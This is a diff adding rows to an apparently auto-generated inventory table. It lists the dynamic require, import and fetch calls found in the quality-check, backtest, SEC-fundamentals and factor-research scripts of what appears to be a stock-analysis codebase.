+| scripts/quality/tests/find-unused.test.mjs | `` fetch(path + '<a href="/not-a-real-artifact.json">')`]]),sizes=new Map([['dynamic.js',100]]) `` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "fx-rates.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "fx-provider-registry.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "currency-engine.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "currency-registry.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "money-format.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "currency-contract.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "fx-realtime-state.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "fx-freshness.js")) ` |
+| scripts/quality/verify-currency-layer.mjs | ` require(join(FXDIR, "fx-freshness.js")) ` |
+| scripts/quality/verify-historical-fx-coverage.mjs | ` require(join(FXDIR, "fx-rates.js")) ` |
+| scripts/quality/verify-historical-fx-coverage.mjs | ` require(join(FXDIR, "fx-provider-registry.js")) ` |
+| scripts/quality/verify-multi-asset.mjs | ` require(join(root, "quant/engines/multi-asset/asset-taxonomy.js")) ` |
+| scripts/quality/verify-multi-asset.mjs | ` require(join(root, "quant/engines/multi-asset/instrument-catalog.js")) ` |
+| scripts/quality/verify-multi-asset.mjs | ` require(join(root, "quant/api/multi-asset-contract.js")) ` |
+| scripts/quality/verify-multi-asset.mjs | ` require(join(root, "quant/config/multi-asset.json")) ` |
+| scripts/quality/verify-multi-asset.mjs | ` require(join(root, "quant/config/market-calendar.json")) ` |
+| scripts/quality/verify-multi-asset.mjs | ` require(join(root, "providers/fred/adapter.js")) ` |
+| scripts/quality/verify-multi-asset.mjs | ` fetch(SITE + path + (path.includes("?") ? "&" : "?") + "v=" + Date.now(), { headers: { "Cache-Control": "no-cache" } }) ` |
+| scripts/quality/verify-realtime-eur.mjs | ` require(join(FXDIR, "fx-rates.js")) ` |
+| scripts/quality/verify-realtime-eur.mjs | ` require(join(FXDIR, "fx-provider-registry.js")) ` |
+| scripts/quality/verify-realtime-eur.mjs | ` require(join(FXDIR, "fx-freshness.js")) ` |
+| scripts/quality/verify-realtime-eur.mjs | ` require(join(FXDIR, "fx-realtime-state.js")) ` |
+| scripts/quality/verify-realtime-eur.mjs | ` require(join(FXDIR, "currency-contract.js")) ` |
+| scripts/quality/verify-realtime-eur.mjs | ` require(join(FXDIR, "money-format.js")) ` |
+| scripts/quality/verify-realtime-eur.mjs | `` fetch(`${BASE}/iex/?tickers=${tickers.join(",")}`, `` |
+| scripts/quality/vu3-regression-qa.mjs | ` require(arg('playwright', process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright')) ` |
+| scripts/quality/vu3-regression-qa.mjs | ` fetch(base + '/supertrader/data/build.json').then((r) => r.json()).then((j) => (j.slices && j.slices.stock) &#124;&#124; []).catch(() => []) ` |
+| scripts/quant/assert-product-completeness.mjs | ` require(join(ROOT, "quant/engines/product-language.js")) ` |
+| scripts/quant/assert-product-completeness.mjs | ` require(join(ROOT, enginePath)) ` |
+| scripts/quant/backtest-generation-freeze.cjs | ` import(path.join(ROOT,'scripts/market/build-security-master-identity-blocklist.mjs')) ` |
+| scripts/quant/build-backtest-certification.mjs | ` require(P("quant/engines/backtest-certification.js")) ` |
+| scripts/quant/build-backtest-certification.mjs | ` require(P("quant/engines/profile-backtest.js")) ` |
+| scripts/quant/build-backtest-certification.mjs | ` require(P("quant/engines/signal-backtest.js")) ` |
+| scripts/quant/build-backtest-certification.mjs | ` require(P("quant/engines/backtest-artifact-consistency.js")) ` |
+| scripts/quant/build-backtest-certification.mjs | ` require(P("quant/engines/setup-oos.cjs")) ` |
+| scripts/quant/build-backtest-certification.mjs | ` require(P("quant/engines/survivorship-control.js")) ` |
+| scripts/quant/build-backtest-readiness.mjs | ` require(join(ROOT, "quant/engines/backtest-artifact-consistency.js")) ` |
+| scripts/quant/build-emerging-leaders-study.mjs | ` require(join(ROOT, "quant/engines/emerging-leaders.js")) ` |
+| scripts/quant/build-emerging-leaders-study.mjs | ` require(join(ROOT, "quant/engines/survivorship-control.js")) ` |
+| scripts/quant/build-emerging-leaders-study.mjs | ` require(join(ROOT, "quant/engines/history-store.js")) ` |
+| scripts/quant/build-emerging-leaders-study.mjs | ` require(join(ROOT, "quant/engines/zero-cost-guard.js")) ` |
+| scripts/quant/build-emerging-leaders-study.mjs | ` import(join(ROOT, "scripts/market/storage/s3-driver.mjs")) ` |
+| scripts/quant/build-evidence-status.mjs | ` require(P("quant/engines/historical-cases.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/change-engine.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/fundamental-inputs.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/published-close.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/catalog.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/quant-radar.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/us-security-master.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/survivorship-control.js")) ` |
+| scripts/quant/build-factor-evidence.mjs | ` require(join(ROOT, "quant/engines/market-cap.js")) ` |
+| scripts/quant/build-golden-five-pit-coverage.mjs | ` require(join(root, "providers", "sec", "adapter.js")) ` |
+| scripts/quant/build-market-regime.mjs | ` require(join(ROOT, "quant/engines/market-regime.js")) ` |
+| scripts/quant/build-methodology-index.mjs | ` require(join(ROOT, "quant/engines/product-language.js")) ` |
+| scripts/quant/build-pattern-match.mjs | ` require(join(ROOT, "quant/engines/pattern-research.js")) ` |
+| scripts/quant/build-pattern-match.mjs | ` require(join(ROOT, "quant/engines/pit-fundamental-history.js")) ` |
+| scripts/quant/build-pattern-research-fundamentals.mjs | ` require(join(ROOT, "quant/engines/pattern-research.js")) ` |
+| scripts/quant/build-pattern-research-fundamentals.mjs | ` require(join(ROOT, "quant/engines/pit-fundamental-history.js")) ` |
+| scripts/quant/build-pattern-research.mjs | ` require(join(ROOT, "quant/engines/pattern-research.js")) ` |
+| scripts/quant/build-product-language-doc.mjs | ` require(join(ROOT, "quant/engines/product-language.js")) ` |
+| scripts/quant/build-quant-radar.mjs | ` require(join(ROOT, "quant/engines/quant-radar.js")) ` |
+| scripts/quant/build-quant-radar.mjs | ` require(join(ROOT, "quant/engines/setup-engine.js")) ` |
+| scripts/quant/build-quant-radar.mjs | ` require(join(ROOT, "quant/engines/historical-cases.js")) ` |
+| scripts/quant/build-quant-radar.mjs | ` require(join(ROOT, "quant/engines/us-security-master.js")) ` |
+| scripts/quant/build-quant-radar.mjs | ` require(join(ROOT, "quant/engines/survivorship-control.js")) ` |
+| scripts/quant/build-quant-radar.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| scripts/quant/build-quant-radar.mjs | ` require(join(ROOT, "quant/engines/radar-event-quarantine.js")) ` |
+| scripts/quant/build-quant-radar.mjs | ` require(join(ROOT, "quant/app/view-model.js")) ` |
+| scripts/quant/build-sec-quant-panel.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/quant/build-sec-quant-panel.mjs | ` require(join(engines, "schema.js")) ` |
+| scripts/quant/build-sec-quant-panel.mjs | ` require(join(engines, "factors.js")) ` |
+| scripts/quant/build-sec-quant-panel.mjs | ` require(join(engines, "sec-fact-panel.js")) ` |
+| scripts/quant/build-sec-quant-panel.mjs | ` require(join(engines, "panel-builder.js")) ` |
+| scripts/quant/build-sec-quant-panel.mjs | ` require(join(engines, "published-close.js")) ` |
+| scripts/quant/build-sec-quant-panel.mjs | ` require(join(root, "providers", "sec", "adapter.js")) ` |
+| scripts/quant/build-setup-backtest.mjs | ` require(join(ROOT, "quant/engines/signal-backtest.js")) ` |
+| scripts/quant/build-setup-backtest.mjs | ` require(join(ROOT, "quant/engines/canonical-total-return.js")).VERSION ` |
+| scripts/quant/build-setup-observations.mjs | ` require(join(ROOT, "quant/engines/setup-engine.js")) ` |
+| scripts/quant/build-setup-observations.mjs | ` require(join(ROOT, "quant/engines/catalog.js")) ` |
+| scripts/quant/build-setup-outcomes.mjs | ` require(join(ROOT, "quant/engines/signal-backtest.js")) ` |
+| scripts/quant/build-sic-peer-taxonomy.mjs | ` require(join(root, "quant", "engines", "sic-peer-taxonomy.js")) ` |
+| scripts/quant/build-signal-backtest.mjs | ` require(join(ROOT, "quant/engines/signal-backtest.js")) ` |
+| scripts/quant/build-signal-backtest.mjs | ` require(join(ROOT, "quant/engines/market-quality.js")) ` |
+| scripts/quant/build-signal-backtest.mjs | ` require(join(ROOT, "quant/engines/canonical-total-return.js")) ` |
+| scripts/quant/build-strategy-index.mjs | ` require(join(ROOT, "quant/engines/strategy-match.js")) ` |
+| scripts/quant/build-strategy-index.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| scripts/quant/build-survivorship-control.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/quant/build-survivorship-control.mjs | ` require(join(ROOT, "quant/engines/survivorship-control.js")) ` |
+| scripts/quant/build-survivorship-control.mjs | ` require(join(ROOT, "quant/engines/market-quality.js")) ` |
+| scripts/quant/build-survivorship-control.mjs | ` require(join(ROOT, "quant/engines/canonical-total-return.js")) ` |
+| scripts/quant/build-survivorship-control.mjs | ` require(join(ROOT, "quant/engines/history-store.js")) ` |
+| scripts/quant/build-survivorship-control.mjs | ` require(join(ROOT, "quant/engines/zero-cost-guard.js")) ` |
+| scripts/quant/build-survivorship-control.mjs | ` import(join(ROOT, "scripts/market/storage/s3-driver.mjs")) ` |
+| scripts/quant/cli.py | ` import (aggregate_coverage, build_consumer_bundle, read_history_shards, write_history_shards, load_fiscal_year_end_hints, ` |
+| scripts/quant/lib/daily-prices.mjs | ` require(join(ROOT, "quant/engines/technical/canonical-bars.js")) ` |
+| scripts/quant/lib/daily-prices.mjs | ` require(join(ROOT, "quant/engines/market-quality.js")) ` |
+| scripts/quant/lib/daily-prices.mjs | ` require(join(ROOT, "quant/engines/canonical-total-return.js")) ` |
+| scripts/quant/lib/daily-prices.mjs | ` require(join(ROOT, "quant/engines/survivorship-control.js")) ` |
+| scripts/quant/lib/emerging-leaders-inputs.mjs | ` require(join(ROOT, "quant/engines/return-series.js")) ` |
+| scripts/quant/lib/emerging-leaders-inputs.mjs | ` require(join(ROOT, "quant/engines/pit-fundamental-history.js")) ` |
+| scripts/quant/lib/emerging-leaders-inputs.mjs | ` require(join(ROOT, "core/identity.js")) ` |
+| scripts/quant/lib/emerging-leaders-inputs.mjs | ` require(join(ROOT, "discover/engines/scoring.js")) ` |
+| scripts/quant/lib/pattern-study.mjs | ` require(join(ROOT, "quant/engines/pattern-research.js")) ` |
+| scripts/quant/measure-backtest-certification.mjs | ` require(P("quant/engines/backtest-certification.js")) ` |
+| scripts/quant/measure-backtest-certification.mjs | ` require(P("quant/engines/signal-backtest.js")) ` |
+| scripts/quant/measure-backtest-certification.mjs | ` require(P("quant/engines/quant-radar.js")) ` |
+| scripts/quant/measure-backtest-signal-intelligence.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| scripts/quant/measure-backtest-signal-intelligence.mjs | ` require(join(ROOT, "quant/engines/signal-backtest.js")) ` |
+| scripts/quant/measure-backtest-signal-intelligence.mjs | ` require(join(ROOT, "quant/engines/quant-radar.js")) ` |
+| scripts/quant/measure-backtest-signal-intelligence.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")), queryEngine: require(join(ROOT, "quant/engines/query.js")) ` |
+| scripts/quant/measure-decision-intelligence.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| scripts/quant/measure-decision-intelligence.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")), queryEngine: require(join(ROOT, "quant/engines/query.js")) ` |
+| scripts/quant/measure-local-coverage-levers.mjs | ` require(join(ROOT, "quant/engines/fundamental-inputs.js")) ` |
+| scripts/quant/measure-methodology-change.mjs | ` require(join(ROOT, "quant/engines/return-basis-comparison.js")) ` |
+| scripts/quant/measure-name-type-evidence.mjs | ` require(join(ROOT, "quant/engines/instrument-classification.js")) ` |
+| scripts/quant/measure-naming-contract.mjs | ` require(join(ROOT, "quant/engines/company-naming-contract.js")) ` |
+| scripts/quant/measure-naming-contract.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| scripts/quant/measure-naming-contract.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| scripts/quant/measure-naming-contract.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| scripts/quant/measure-pipeline-freshness.mjs | ` require(join(ROOT, "quant/engines/realtime/trading-session.js")) ` |
+| scripts/quant/measure-security-type-safety.mjs | ` require(join(ROOT, "quant/engines/instrument-classification.js")) ` |
+| scripts/quant/measure-security-type-safety.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| scripts/quant/portfolio/model-depots.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) ` |
+| scripts/quant/portfolio/model-depots.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) ` |
+| scripts/quant/portfolio/model-depots.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) ` |
+| scripts/quant/portfolio/model-depots.cjs | ` require(path.join(ROOT, 'quant/engines/published-close.js')) ` |
+| scripts/quant/portfolio/model-depots.cjs | ` require(path.join(ROOT, 'core/identity.js')) ` |
+| scripts/quant/portfolio/model-portfolios.cjs | ` require(path.join(ROOT, 'quant/engines/return-series.js')) ` |
+| scripts/quant/portfolio/model-portfolios.cjs | ` require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) ` |
+| scripts/quant/portfolio/model-portfolios.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) ` |
+| scripts/quant/portfolio/model-portfolios.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) ` |
+| scripts/quant/portfolio/model-portfolios.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) ` |
+| scripts/quant/portfolio/model-portfolios.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-risk.cjs')) ` |
+| scripts/quant/portfolio/model-portfolios.cjs | ` require(path.join(ROOT, 'quant/engines/research-delisted-series.cjs')) ` |
+| scripts/quant/refresh-real-backtest.cjs | ` require() cache. ` |
+| scripts/quant/replay-setup-history.mjs | ` require(join(ROOT, "quant/engines/technical/technical-analysis.js")) ` |
+| scripts/quant/replay-setup-history.mjs | ` require(join(ROOT, "quant/engines/technical/canonical-bars.js")) ` |
+| scripts/quant/replay-setup-history.mjs | ` require(join(ROOT, "quant/engines/setup-engine.js")) ` |
+| scripts/quant/research/backtest-coverage-matrix.cjs | ` require(path.join(ROOT, p)) ` |
+| scripts/quant/research/backtest-runner.cjs | ` require(path.join(ROOT, p)) ` |
+| scripts/quant/research/backtest-spec-builder.cjs | ` require(path.join(ROOT, 'quant/engines/signal-backtest.js')) ` |
+| scripts/quant/research/backtest-spec-builder.cjs | ` require(path.join(ROOT, 'scripts/quant/v10/factor/factors.cjs')) ` |
+| scripts/quant/research/backtest-spec-builder.cjs | ` require(path.join(ROOT, 'quant/engines/backtest-kinds.cjs')) ` |
+| scripts/quant/research/pit-snapshot-integrity.cjs | ` require(P('quant/engines/profile-backtest.js')) ` |
+| scripts/quant/run-sec-gates.mjs | ` require(path.join(ROOT, "quant", "engines", "gate-tests.js")) ` |
+| scripts/quant/run-sec-gates.mjs | ` require(path.join(ROOT, "providers", "sec", "adapter.js")) ` |
+| scripts/quant/sec/derived.py | ` import (     NormalizedFact, Provenance, SOURCE_DERIVED, TRANSFORM_FORMULA, ` |
+| scripts/quant/sec/normalize.py | ` import (     Provenance, SOURCE_SEC, TRANSFORM_NONE, QUALITY_HIGH, QUALITY_MEDIUM, ` |
+| scripts/quant/sec/periods.py | ` import (     NormalizedFact, Provenance, SOURCE_SEC, TRANSFORM_NONE, TRANSFORM_YTD_DIFF, ` |
+| scripts/quant/sec/persist-fundamentals.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| scripts/quant/sec/persist-fundamentals.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) ` |
+| scripts/quant/sec/persist-fundamentals.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
+| scripts/quant/sec/reconciliation.py | ` import (DEPTH_YEARS, IN_PRODUCT, REPORT_METRICS, ` |
+| scripts/quant/tests/test_derived.py | ` import (     SOURCE_DERIVED, SOURCE_SEC, TRANSFORM_FORMULA, CompanyProfile, ` |
+| scripts/quant/tests/test_http_and_provider.py | ` import (     DiskCache, RateLimiter, SECHTTPError, SECHttpClient, ` |
+| scripts/quant/tests/test_http_and_provider.py | ` import (     SECProvider, TickerNotFound, normalize_cik, PERIODIC_FORMS, ` |
+| scripts/quant/tests/test_normalize_periods.py | ` import (     TRANSFORM_YTD_DIFF, TRANSFORM_FY_MINUS_YTD, TRANSFORM_NONE, TRANSFORM_SUM, ` |
+| scripts/quant/tests/test_pipeline_and_store.py | ` import (     IngestionPipeline, STATUS_FAILED, STATUS_INGESTED, STATUS_UNCHANGED, ` |
+| scripts/quant/tests/test_restatements.py | ` import (     CompanyFactBook, FactTimeline, Observation, POLICY_AS_OF_LATEST, ` |
+| scripts/quant/tests/test_secpit_v9_corrections.py | ` import (     FiscalCalendar, REJECTED_IMPLAUSIBLE_FILING_FY, REJECTED_LABEL_NOT_INCREASING, ` |
+| scripts/quant/tests/test_secpit_v9_corrections.py | ` import (     ISSUE_FUTURE_PERIOD_END, build_availability_map, normalize_company, ` |
+| scripts/quant/tests/test_universe_resolution.py | ` import (_canonical_ticker, _declared_tickers, _load_universe, ` |
+| scripts/quant/v10/corporate-actions/before-after.cjs | ` require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v10/corporate-actions/before-after.cjs | ` require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v10/corporate-actions/build-ca-registry.cjs | ` require(path.join(root, 'quant/engines/corporate-action-evidence.js')) ` |
+| scripts/quant/v10/corporate-actions/run-tr-ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/quant/v10/corporate-actions/run-tr-ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v10/corporate-actions/run-tr-ledger.cjs | ` require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) ` |
+| scripts/quant/v10/corporate-actions/run-tr-ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v10/factor/common.cjs | ` require(ROOT + '/quant/engines/research-weekly-loader.cjs') ` |
+| scripts/quant/v10/factor/common.cjs | ` require(ROOT + '/quant/engines/weekly-benchmark.cjs') ` |
+| scripts/quant/v10/factor/common.cjs | ` require(ROOT + '/quant/engines/research-contract.cjs') ` |
+| scripts/quant/v10/factor/factors.cjs | ` require(ROOT + '/quant/engines/factor-evidence.js') ` |
+| scripts/quant/v10/factor/factors.cjs | ` require(ROOT + '/quant/engines/fundamental-inputs.js') ` |
+| scripts/quant/v10/factor/factors.cjs | ` require(ROOT + '/quant/engines/market-cap.js') ` |
+| scripts/quant/v10/factor/factors.cjs | ` require(ROOT + '/quant/engines/return-series.js') ` |
+| scripts/quant/v10/factor/factors.cjs | ` require(ROOT + '/quant/methodology/quant-v2.json') ` |
+| scripts/quant/v10/factor/strategy.cjs | ` require(F.ROOT + '/quant/engines/research-portfolio.cjs') ` |
+| scripts/quant/v10/factor/strategy.cjs | ` require(F.ROOT + '/quant/engines/research-validation.cjs') ` |
+| scripts/quant/v10/factor/study.cjs | ` require(F.ROOT + '/quant/engines/research-studies.cjs') ` |
+| scripts/quant/v10/factor/study.cjs | ` require(F.ROOT + '/quant/engines/research-validation.cjs') ` |
+| scripts/quant/v10/factor/study.cjs | ` require(F.ROOT + '/scripts/quant/v9/sensitivity/dependence.cjs') ` |
+| scripts/quant/v10/population/b1_identity.py | ` fetch(cik, f, prefix): ` |
+| scripts/quant/v10/population/b1_identity.py | ` fetch(cik, f, ANNUAL_PREFIX) ` |
+| scripts/quant/v10/population/b1_identity.py | ` fetch(cik, f, ANNUAL_PREFIX if f['form'] in ANNUAL else OTHER_PREFIX) ` |
+| scripts/quant/v10/population/before-after.cjs | ` require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v10/population/before-after.cjs | ` require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v10/population/build-registers.cjs | ` require(file))) ` |
+| scripts/quant/v10/population/build-registers.cjs | ` require(file)) above does not see it, so it is carried over verbatim (correction after the independent V12 review, LARGECAP m9). ` |
+| scripts/quant/v10/population/reasons.cjs | ` require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v10/population/reasons.cjs | ` require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v10/setup/build-setup-independence-decision.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v10/setup/run-setup-reconstruction.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v10/setup/run-setup-reconstruction.cjs | ` require(path.join(ROOT, 'quant/engines/research-studies.cjs')) ` |
+| scripts/quant/v10/setup/run-setup-reconstruction.cjs | ` require(path.join(ROOT, 'quant/engines/research-validation.cjs')) ` |
+| scripts/quant/v10/setup/run-setup-reconstruction.cjs | ` require(path.join(ROOT, 'quant/engines/weekly-benchmark.cjs')) ` |
+| scripts/quant/v10/setup/run-setup-reconstruction.cjs | ` require(path.join(ROOT, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v10/setup/setup-original-inventory.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | ` import(join(ROOT, "scripts/quant/replay-setup-history.mjs")) ` |
+| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | ` require(join(ROOT, "quant/engines/technical/technical-analysis.js")) ` |
+| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | ` require(join(ROOT, "quant/engines/technical/canonical-bars.js")) ` |
+| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | ` require(join(ROOT, "quant/engines/setup-engine.js")) ` |
+| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | ` require(join(ROOT, "quant/engines/research-weekly-loader.cjs")) ` |
+| scripts/quant/v10/setup/setup-reconstruction-feasibility.mjs | ` require(join(ROOT, "quant/engines/research-contract.cjs")) ` |
+| scripts/quant/v10/studies/common.cjs | ` require(ROOT + '/quant/engines/research-contract.cjs') ` |
+| scripts/quant/v10/studies/common.cjs | ` require(ROOT + '/quant/engines/research-weekly-loader.cjs') ` |
+| scripts/quant/v10/studies/common.cjs | ` require(ROOT + '/quant/engines/research-studies.cjs') ` |
+| scripts/quant/v10/studies/common.cjs | ` require(ROOT + '/quant/engines/research-validation.cjs') ` |
+| scripts/quant/v10/studies/common.cjs | ` require(ROOT + '/quant/engines/weekly-benchmark.cjs') ` |
+| scripts/quant/v10/studies/common.cjs | ` require(ROOT + '/quant/engines/signal-backtest.js') ` |
+| scripts/quant/v10/studies/pattern-study.cjs | ` require(K.ROOT + '/quant/engines/pattern-research.js') ` |
+| scripts/quant/v10/studies/signal-study.cjs | ` require(K.ROOT + '/quant/engines/research-portfolio.cjs') ` |
+| scripts/quant/v11/decomposition/portfolio.cjs | ` require(K.ROOT + '/quant/engines/research-portfolio.cjs') ` |
+| scripts/quant/v11/decomposition/register.cjs | ` require(ROOT + '/quant/engines/research-validation.cjs') ` |
+| scripts/quant/v11/discovery/lib.cjs | ` require(ROOT + '/scripts/quant/v10/studies/common.cjs') ` |
+| scripts/quant/v11/discovery/lib.cjs | ` require(ROOT + '/quant/engines/research-portfolio.cjs') ` |
+| scripts/quant/v11/discovery/lib.cjs | ` require(ROOT + '/quant/engines/research-validation.cjs') ` |
+| scripts/quant/v11/discovery/lib.cjs | ` require(ROOT + '/quant/engines/research-contract.cjs') ` |
+| scripts/quant/v11/winners/build.cjs | ` require(K.ROOT + '/quant/engines/fundamental-inputs.js').compute(v.doc, cutoff, W.finite(mc.value) ? mc.value : null) ` |
+| scripts/quant/v11/winners/registration.cjs | ` require(ROOT + '/quant/engines/research-validation.cjs') ` |
+| scripts/quant/v12/indexpop/build-outputs.cjs | ` require(path.join(ROOT, 'quant/engines/return-series.js')) ` |
+| scripts/quant/v12/indexpop/map-members.cjs | ` require(path.join(ROOT, 'core/identity.js')) ` |
+| scripts/quant/v12/indexpop/map-members.cjs | ` require(path.join(ROOT, 'quant/engines/return-series.js')) ` |
+| scripts/quant/v12/indexpop/qualify.cjs | ` require(path.join(ROOT, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v12/indexpop/run-pipeline.sh | ` fetch (inventory.py, fetch_docs.py, fates.py fetch separately). ` |
+| scripts/quant/v12/largecap/export-ca-frame.cjs | ` require(path.join(root, 'quant/engines/corporate-action-evidence.js')) ` |
+| scripts/quant/v12/largecap/export-ca-frame.cjs | ` require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v12/largecap/qualify-sets.cjs | ` require(path.join(ROOT, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v12/mcap/classify.cjs | ` require(ROOT + '/quant/engines/research-pit-market-cap.cjs') ` |
+| scripts/quant/v12/mcap/panel.cjs | ` require(F.ROOT + '/quant/engines/research-pit-market-cap.cjs') ` |
+| scripts/quant/v12/mcap/review-correction.cjs | ` require(path.join(ROOT, 'scripts/quant/v10/factor/panel.cjs')) ` |
+| scripts/quant/v12/mcap/winners-preload.cjs | ` require(ROOT + '/scripts/quant/v10/studies/common.cjs') ` |
+| scripts/quant/v12/mcap/winners-preload.cjs | ` require(ROOT + '/scripts/quant/v10/factor/factors.cjs') ` |
+| scripts/quant/v12/mcap/winners-preload.cjs | ` require(ROOT + '/scripts/quant/v10/factor/common.cjs') ` |
+| scripts/quant/v12/mcap/winners-preload.cjs | ` require(ROOT + '/quant/engines/research-pit-market-cap.cjs') ` |
+| scripts/quant/v12/requal/lib.cjs | ` require(ROOT + '/quant/engines/research-index-population.cjs') ` |
+| scripts/quant/v12/requal/lib.cjs | ` require(ROOT + '/quant/engines/research-listing-lifecycle.cjs').records, cases = [] ` |
+| scripts/quant/v12/requal/p5a-population.cjs | ` require(L.ROOT + '/scripts/quant/v10/studies/common.cjs') ` |
+| scripts/quant/v12/requal/p5b-signals.cjs | ` require(L.ROOT + '/scripts/quant/v10/studies/common.cjs') ` |
+| scripts/quant/v12/requal/p5b-signals.cjs | ` require(o.p5a), p5aSha = L.shaFile(o.p5a) ` |
+| scripts/quant/v12/requal/p5b-signals.cjs | ` require(L.ROOT + '/docs/quant-recovery/v11/decomposition/decomposition-results.json').A1_decomposition.cells ` |
+| scripts/quant/v12/requal/p5c-factor.cjs | ` require(L.ROOT + '/scripts/quant/v10/factor/factors.cjs') ` |
+| scripts/quant/v12/requal/p5c-factor.cjs | ` require(L.ROOT + '/docs/quant-recovery/v10/factor/factor-study-1.0.0.json').table ` |
+| scripts/quant/v12/requal/p5d-attribution.cjs | ` require(D('p5a-population-1.1.0.json')), b = require(D('p5b-signals-1.1.0.json')), c = require(D('p5c-factor-1.1.0.json')), s = require(D('p6-strategies-1.1.0.json')) ` |
+| scripts/quant/v12/requal/p6-strategies.cjs | ` require(o.p5a) ` |
+| scripts/quant/v12/spxpop/build-population.cjs | ` require(path.join(ROOT, 'scripts/quant/v12/indexpop/lib.cjs')) ` |
+| scripts/quant/v12/spxpop/build-population.cjs | ` require(path.join(ROOT, 'quant/engines/research-index-population.cjs')) ` |
+| scripts/quant/v12/spxpop/build-population.cjs | ` require(path.join(ROOT, 'quant/engines/return-series.js')) ` |
+| scripts/quant/v12/spxpop/build-population.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v12/spxpop/build-population.cjs | ` require(path.join(ROOT, 'quant/engines/research-pit-market-cap.cjs')) ` |
+| scripts/quant/v12/spxpop/build-population.cjs | ` require(path.join(ROOT, 'quant/engines/research-listing-lifecycle.cjs')).records ` |
+| scripts/quant/v13/largecap/evaluate.cjs | ` require(path.join(ROOT, 'quant/engines/corporate-action-evidence.js')) ` |
+| scripts/quant/v13/largecap/evaluate.cjs | ` require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v13/studies/lib.cjs | ` require(ROOT + '/scripts/quant/v10/studies/common.cjs') ` |
+| scripts/quant/v13/studies/run-frame.cjs | ` require(W.ROOT + '/quant/engines/research-delisted-series.cjs') ` |
+| scripts/quant/v13/studies/run-frame.cjs | ` require(W.ROOT + '/scripts/quant/v10/studies/signal-study.cjs') ` |
